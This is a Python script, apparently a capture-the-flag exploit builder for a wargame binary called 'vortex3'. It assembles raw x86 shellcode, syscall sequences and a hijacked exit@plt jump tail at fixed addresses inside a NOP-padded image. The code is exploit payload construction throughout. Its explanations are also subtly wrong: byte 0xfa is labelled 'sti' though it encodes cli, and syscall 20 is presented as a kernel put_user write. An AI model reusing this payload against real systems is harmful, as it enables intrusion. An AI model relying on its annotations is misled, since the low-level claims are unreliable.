"""LowHost for the two-trap / put_user route found from vortex3.

The exit frame copied to /tmp/ownership.$$.tar has eip 0x0804b0dc (the tail of
exit@plt: `mov eax,[ebx]; add eax,edi; jmp eax`, ebx = 0x0804b00c, edi = 0x8ca)
and the register file the kernel saved on the child's stack.

LowHost body at 0x08048000:
  sti; mov eax,20; mov ebx,9; int 0x80    put_user_kernel: writes the image
                                          modifier at 0x0804b000
  mov eax,1; xor ebx,ebx; int 0x80        clean exit so vortex3 finishes

The mailbox at 0x0804b100 holds 0x0804b100, which is where the copied exit
leaves eax.  The pointer now runs almost one page past the body, into
0x0804b0dc (the copied exit tail), whose eax becomes edi and jumps with
ebx = 0x0804b00c (mailbox+0x0c = 0x0804b100 again).
"""
import struct

lo = lambda v: struct.pack("<I", v & 0xffffffff)
HOST_MAILBOX = 0x0804b100
PROG = 0x08048300


def body():
    return b"\xfa" + b"\xb8" + lo(20) + b"\xbb" + lo(9) + b"\xcd\x80" \
         + b"\xb8" + lo(1) + b"\x31\xdb" + b"\xcd\x80"


def build():
    out = bytearray(b"\x90" * 0x4000)
    out[0:len(body())] = body()
    def put(addr, data):
        o = addr - 0x08048000
        if o + len(data) > len(out):
            out.extend(b"\x90" * (o + len(data) - len(out)))
        out[o:o + len(data)] = data
    # mailbox row: [$eax+0x64] = 0x08048300 (the entry point)
    row = bytearray(0x64)
    row[0:4] = lo(PROG)
    put(0x0804b100, bytes(row))
    # the copied exit tail at 0x0804b0dc: 8b 03 01 f8 ff e0  (mov eax,[ebx]; add eax,edi; jmp eax)
    put(0x0804b0dc, b"\x8b\x03\x01\xf8\xff\xe0" + b"\x90" * 6)
    # the entry point 0x08048300: sti; pusha; int 0x80; mov eax,1; xor ebx,ebx; int 0x80
    put(PROG, b"\xfa" + b"\x60" + b"\xcd\x80" + b"\x90" * 0x20 + b"\xb8" + lo(1) + b"\x31\xdb" + b"\xcd\x80")
    return bytes(out)


if __name__ == "__main__":
    b = build()
    print("bytes", len(b), "ends", hex(0x08048000 + len(b)), "body", body().hex())